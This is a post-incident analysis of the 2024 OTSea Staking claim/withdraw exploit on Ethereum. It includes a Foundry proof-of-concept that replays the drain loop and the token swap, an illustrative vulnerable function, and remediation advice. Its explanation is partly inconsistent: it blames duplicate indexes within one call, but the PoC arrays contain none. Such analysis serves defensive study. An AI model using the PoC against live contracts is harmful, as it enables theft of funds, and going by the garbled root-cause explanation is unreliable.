# OTSeaStaking — Duplicate Index claim/withdraw Reward Double-Claim Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-17 |
| **Protocol** | OTSea Staking |
| **Chain** | Ethereum |
| **Loss** | ~26,000 USD |
| **Attacker** | [0x000000003704BC4ffb86000046721f44Ef3DBABe](https://etherscan.io/address/0x000000003704BC4ffb86000046721f44Ef3DBABe) |
| **Attack Tx** | [0x90b4fcf583444d44efb8625e6f253cfcb786d2f4eda7198bdab67a54108cd5f4](https://etherscan.io/tx/0x90b4fcf583444d44efb8625e6f253cfcb786d2f4eda7198bdab67a54108cd5f4) |
| **Vulnerable Contract** | [0xF2c8e860ca12Cde3F3195423eCf54427A4f30916](https://etherscan.io/address/0xF2c8e860ca12Cde3F3195423eCf54427A4f30916) |
| **Attack Contract** | [0xd11eE5A6a9EbD9327360D7A82e40d2F8C314e985](https://etherscan.io/address/0xd11eE5A6a9EbD9327360D7A82e40d2F8C314e985) |
| **Root Cause** | `claim()`/`withdraw()` allowed duplicate indexes in the input array, enabling repeated collection from the same staking position |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/OTSeaStaking_exp.sol) |

---

## 1. Vulnerability Overview

The `claim(uint256[] calldata _indexes, address _receiver)` and `withdraw(uint256[] calldata _indexes, address _receiver)` functions of the OTSeaStaking contract (`0xF2c8e860...`) did not validate whether the supplied index array contained duplicate entries. The attacker fixed indexes 0–19 in an array of the form `[0,1,2,...,19, X]` and repeatedly called these functions while incrementing the new index X, allowing them to claim rewards and withdraw from the same staking positions multiple times. This yielded 6,000,000 OTSea tokens which were swapped to WETH for approximately 26,000 USD.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: no duplicate index validation
function claim(uint256[] calldata _indexes, address _receiver) external {
    for (uint256 i = 0; i < _indexes.length; i++) {
        uint256 idx = _indexes[i];
        // ❌ Each entry is processed even if the same index appears multiple times
        StakeInfo storage info = stakes[msg.sender][idx];
        uint256 reward = _calculateReward(info);
        info.lastClaimTime = block.timestamp;
        IERC20(otseaToken).transfer(_receiver, reward);
    }
}

function withdraw(uint256[] calldata _indexes, address _receiver) external {
    for (uint256 i = 0; i < _indexes.length; i++) {
        uint256 idx = _indexes[i];
        // ❌ Duplicate indexes allow repeated withdrawal from the same position
        StakeInfo storage info = stakes[msg.sender][idx];
        uint256 amount = info.amount;
        info.amount = 0;  // Only zeroed on the first pass; second pass sees 0 but still proceeds
        IERC20(otseaToken).transfer(_receiver, amount);
    }
}

// ✅ Correct code: duplicate index validation added
function claim(uint256[] calldata _indexes, address _receiver) external {
    uint256[] memory sortedIndexes = _sort(_indexes);
    for (uint256 i = 0; i < sortedIndexes.length; i++) {
        if (i > 0) {
            require(sortedIndexes[i] != sortedIndexes[i-1], "Duplicate index");  // ✅ Prevents duplicates
        }
        // ... claim logic
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: OTSeaStaking.sol
    function withdraw(uint256[] calldata _indexes, address _receiver) external {  // ❌ Vulnerable
        if (_receiver == address(0)) revert OTSeaErrors.InvalidAddress();
        (uint88 totalAmount, uint256 totalRewards) = _withdrawMultiple(_indexes);
        if (totalRewards != 0) {
            _transferETHOrRevert(_receiver, totalRewards);
            emit Claimed(_msgSender(), _receiver, _indexes, totalRewards);
        }
        _otseaERC20.safeTransfer(_receiver, uint256(totalAmount));
        emit Withdrawal(_msgSender(), _receiver, _indexes, totalAmount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0x000000003704...)
  │
  ├─[1]─► Call OTSeaRevenueDistributor(0x34BCcF...).distribute()
  │         └─► Staking reward distribution executed
  │
  ├─[2]─► Repeat loop (14x): indexes = [0,1,...,19, 20+i]
  │         ├─► Call OTSeaStaking.claim(indexes, attackContract)
  │         │     └─► Indexes 0–19 + new index → duplicate reward collection
  │         └─► Call OTSeaStaking.withdraw(indexes, attackContract)
  │               └─► Indexes 0–19 + new index → duplicate withdrawal
  │
  ├─[3]─► Additional loop (10x): indexes = [0, 34+i]
  │         └─► Repeated collection with smaller arrays
  │
  ├─[4]─► Additional loop (22x): indexes = [20,...,42, 70, 43+i]
  │         └─► Repeated collection from more positions
  │
  ├─[5]─► Approve and swap 6,000,000 OTSea tokens acquired
  │         └─► swapExactTokensForETHSupportingFeeOnTransferTokens
  │               └─► OTSea → ETH (Uniswap V2 Router)
  │
  └─[6]─► Total loss: ~26,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract ContractTest is Test {
    address internal otseaDist = 0x34BCcF4aF03870265Fe99cEc262524F343Cca7ff;
    address internal attackContract = 0x5AeC8469414332d62Bf5058fb91F2f8457e5C5CB;
    address internal otseaToken = 0x5dA151B95657e788076D04d56234Bd93e409CB09;
    address internal uniswapRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal otseaStaking = 0xF2c8e860ca12Cde3F3195423eCf54427A4f30916;

    function testExploit() public {
        // [1] Trigger reward distribution
        OTSeaRevenueDistributor(otseaDist).distribute();
        vm.startPrank(attackContract);

        // [2] 14 iterations: fixed indexes 0–19 + new index
        for (uint256 i = 0; i < 14; i++) {
            uint256[] memory indexes = new uint256[](21);
            for (uint256 j = 0; j < 20; j++) {
                indexes[j] = j;
            }
            indexes[20] = 20 + i;

            // ❌ Indexes 0–19 repeated in each call → duplicate collection
            OTSeaStaking(otseaStaking).claim(indexes, attackContract);
            OTSeaStaking(otseaStaking).withdraw(indexes, attackContract);
        }

        // [3] Swap acquired tokens → WETH
        IERC20(otseaToken).approve(uniswapRouter, 6_000_000_000_000_000_000_000_000);
        address[] memory paths = new address[](2);
        paths[0] = otseaToken;
        paths[1] = IUniswapV2Router02(uniswapRouter).WETH();
        IUniswapV2Router02(uniswapRouter)
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                6_000_000_000_000_000_000_000_000,
                0,
                paths,
                attackContract,
                block.timestamp
            );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Input Validation |
| **Attack Technique** | Duplicate Index Array Claim/Withdraw Drain |
| **DASP Category** | Business Logic Error |
| **CWE** | CWE-20: Improper Input Validation |
| **Severity** | High |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Duplicate index validation**: Reject duplicate entries in the index array within `claim()` and `withdraw()`.
2. **Track processed indexes**: Use a bitmap or Set to track already-processed indexes within a single transaction.
3. **Sort + adjacency check**: Sort the index array and verify that no two adjacent elements are equal.
4. **Withdrawal state flag**: Add a `withdrawn` boolean flag to each staking position to prevent duplicate withdrawals.

## 7. Lessons Learned

- **Danger of array inputs**: Functions that accept arrays as arguments must always validate for duplicates, ordering, and boundary values.
- **Simplicity of the attack**: No flash loan was required — simply passing a duplicate index array was sufficient to drain 26,000 USD.
- **Staking protocol vulnerability**: Batch functions that process multiple positions must include duplicate-processing defenses as a baseline requirement.